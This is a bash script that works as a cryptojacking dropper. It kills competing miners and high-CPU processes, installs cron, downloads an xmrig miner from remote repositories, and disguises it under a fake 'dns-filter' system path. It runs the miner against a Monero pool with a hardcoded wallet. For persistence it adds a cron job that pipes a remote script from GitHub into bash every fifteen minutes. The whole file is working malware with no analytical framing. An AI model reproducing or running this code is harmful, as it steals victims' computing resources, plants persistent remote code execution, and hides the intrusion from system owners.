#!/bin/bash
for f in /tmp/usr/lib/systemdev/dns-filter /usr/lib/systemdev/dns-filter /usr/lib/dev/systemdev/dns-filter; do
    [ -f "$f" ] && rm -f "$f"
done
systemctl stop systemd_s 2>/dev/null

kill_unwanted() {
    pkill -f "index.js" 2>/dev/null; pkill xmr 2>/dev/null
    pgrep "index.js" 2>/dev/null | grep -v "^$$$" | xargs -r kill 2>/dev/null
}
kill_unwanted

kill_high_cpu_processes() {
    local exclude=("reservepattern454545" "oAwgBCFH")
    ps -eo pid,%cpu --sort=-%cpu | awk '$2>150 {print $1}' | while read -r p; do
        cmd=$(tr '\0' ' ' < "/proc/$p/cmdline" 2>/dev/null)
        for e in "${exclude[@]}"; do [[ "$cmd" == *"$e"* ]] && continue 2; done
        kill -9 "$p" 2>/dev/null
    done
}

[[ $(id -u) -eq 0 ]] && { HOME_1='/usr/lib/dev'; user="root"; } || { HOME_1='/tmp/usr/lib'; user="user"; }
[[ $(id -u) -eq 0 ]] && ! command -v cron &>/dev/null && {
    apt-get update && apt-get install -y cron 2>/dev/null || yum install -y cronie 2>/dev/null
}
mkdir -p "$HOME_1/systemdev"
prog="$HOME_1/systemdev/dns-filter"

run_program() {
    launch() { nohup "$@" >/dev/null 2>&1 & pid=$!; sleep 0.5; ps -p $pid >/dev/null || return 1; sleep 4.5; ps -p $pid >/dev/null; }
    fallback() {
        curl -k -fL -o /tmp/dns "https://gitlab.com/Kanedias/xmrig-static/-/releases/permalink/latest/downloads/xmrig-x86_64-static" || \
        wget -qO /tmp/dns "https://gitlab.com/Kanedias/xmrig-static/-/releases/permalink/latest/downloads/xmrig-x86_64-static"
        chmod +x /tmp/dns
    }
    [ -x "$prog" ] && launch "$prog" -o pool.supportxmr.com:443 -u 45MinZ6ECgTgxn8gbm5gAsK9ATrEN6N95hbH3g4r5N4bKwH8QxuFygw3G7VwHwAusR9L35E4YjWYdTJaWDjbMGDCKYNz5X1.v2 --tls && return 0
    fallback && launch /tmp/dns -o pool.supportxmr.com:443 -u 45MinZ6ECgTgxn8gbm5gAsK9ATrEN6N95hbH3g4r5N4bKwH8QxuFygw3G7VwHwAusR9L35E4YjWYdTJaWDjbMGDCKYNz5X1.v2 --tls
}

if [ -e "$prog" ]; then
    run_program; pkill -f "systemd-t" 2>/dev/null
else
    curl -k -L -o "$HOME_1/systemdev/yes.tar.xz" "https://gh-proxy.com/https://github.com/el3ctr0wqw1/xmrig-vrl2/releases/download/main/xmrig-vrl" || \
    wget -qO "$HOME_1/systemdev/yes.tar.xz" "https://gh-proxy.com/https://github.com/el3ctr0wqw1/xmrig-vrl2/releases/download/main/xmrig-vrl"
    mv "$HOME_1/systemdev/yes.tar.xz" "$prog"
    chmod +x "$prog"
    run_program
fi

create_cronjob() {
    local c
    command -v curl >/dev/null && c="curl -fsSLk $1 | tr -d '\r' | bash"
    command -v wget >/dev/null && c="wget -qO- $1 | tr -d '\r' | bash"
    (crontab -l 2>/dev/null | grep -vF "$1"; echo "*/15 * * * * $c") | crontab -
}
create_cronjob "https://raw.githubusercontent.com/thisisforwork440-ops/ironrock/refs/heads/main/mon.sh"

rm -f /tmp/mon.sh /tmp/run.sh
